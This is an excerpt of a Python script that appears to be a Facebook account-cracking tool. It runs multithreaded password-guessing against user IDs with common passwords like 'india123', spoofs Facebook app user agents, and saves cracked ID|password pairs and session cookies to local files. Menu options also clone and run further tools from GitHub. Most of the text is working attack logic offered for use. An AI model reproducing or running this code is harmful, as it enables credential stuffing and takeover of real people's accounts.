...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS FARIS ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
try:
	...
	os.system('python FARIS.py')
os.system("clear")
print('\n\033[1;32m JOIN https://www.facebook.com/malak.tayabkhan.5....')
...
def FARIS():
		...
		if shm =='1':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100000393670554&mibextid=ZbWKwL//")
			file_crack()
		elif shm =='2':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100000393670554&mibextid=ZbWKwL")
			r_crack()
			...
			clear()
			os.system('rm -rf Dump && git clone https://github.com/TAYAB-KHAN/Dump.git && cd Dump && python Dump.py')
		elif shm =='5':
			os.system('git clone https://github.com/TAYAB-KHAN/Marshal && cd Marshal && python Marshal.py')
		elif shm =='6':
			os.system('xdg-open https://www.facebook.com/profile.php?id=100000393670554&mibextid=ZbWKwL')
			FARIS()
		elif shm =='7':
...
def file_crack():
	...
	with tred(max_workers=30) as FARIS:
		clear()
		tl = str(len(fo))
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In FARIS Folder")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				FARIS.submit(api1,ids,names,passlist)
			else:
				FARIS.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def afg():
	...
	with tred(max_workers=30) as FARIS:
		...
		print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
		print("\33[1;37m [+] Your Cp/Ok Id Save In TAYAB Folder")
		linex()
		for psx in user:
			ids = code+psx
	...
	for psx in user:
		ids = code+psx
        passlist = [ids,psx,'57273200','india123','kumar1234','rakish kumar','hindustan','Yadva123','Palvei']
        FARIS.submit(rd1,ids,passlist)
    print('\033[1;37m')
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ FARIS ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				xxx = '[FBAN/FB4A;FBAV/;FBBV/;[FBAN/rFB4A;FBAV/272.0.0.6.129;FBBV/20454115;FBDM/){density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/4.0;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";'[FBAN/FB4A;FBAV/395.0.0.20.914;FBBV/52137362;[FBAN/FB4A;FBAV/395.0.0.20.914;FBPN/com.facebook.lite;FBLC/en_US;FBBV/52137362;FBCR/Etisalat;FBMF/ITEL MOBILE LIMITED;FBBD/Itel;FBDV/itel S661LP;FBSV/7.1.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;] FBBK/1;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[FARIS-OK] '+uid+' | '+pas)		                    
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'FARIS_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'FARIS_COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [TAYAB-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'FARIS-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ FARIS-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [FARIS-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'FARIS_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
